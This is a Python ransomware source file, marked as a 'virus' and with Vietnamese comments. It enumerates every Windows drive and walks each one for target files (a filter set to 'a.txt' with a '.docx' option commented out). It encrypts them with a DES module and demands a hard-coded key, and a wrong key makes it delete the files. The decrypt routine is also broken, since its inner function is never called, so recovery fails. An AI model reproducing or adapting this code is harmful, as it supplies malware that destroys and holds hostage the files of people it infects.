### THE VIRUS STARTS HERE ###
#6
def run():
    drives = get_drives()
    pathfiles = get_file(drives)
    encpyt(pathfiles)
   
    print("Ban trong that nguy hiem")
    keyworld= input("Nhap key de mo khoa ")
    if (keyworld=="anhtuan"):
         decrypt(pathfiles)
    else:
        for file in pathfiles:
            os.remove(file)

#end
#5
def decrypt(pathfiles):

  
        def decrypt(pathfiles):
            for i in pathfiles:
                DES.decrypt(i)
    

#end
#4
def encpyt( pathfiles):
    # mã hóa 

    for i in pathfiles:
    
        try:
            DES.encrypt(i)
                
        except shutil.SameFileError:
            pass

#end

#2 
# lấy path và thêm vào một file 
def get_drives(): 
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(letter)
            bitmask >>= 1
        return drives
#end
#3
def get_file(drives):
    pathfiles=[]
    for i in drives:
        src_dir = i + ':\\'
        filePath = ''
        for dirpath, subdirs, files in os.walk(src_dir):
            for x in files:
                #  if x.endswith(".docx"): 
                if x=='a.txt':
                    pathfiles.append(os.path.join(dirpath, x))


    for i in pathfiles:
        print (i,end='')
    return pathfiles

#end

#0
import threading
import random
import glob, sys
sys.path.append("./DES")
import DES
import string, os, shutil
from ctypes import windll
#end
    
### THE VIRUS ENDS HERE ###

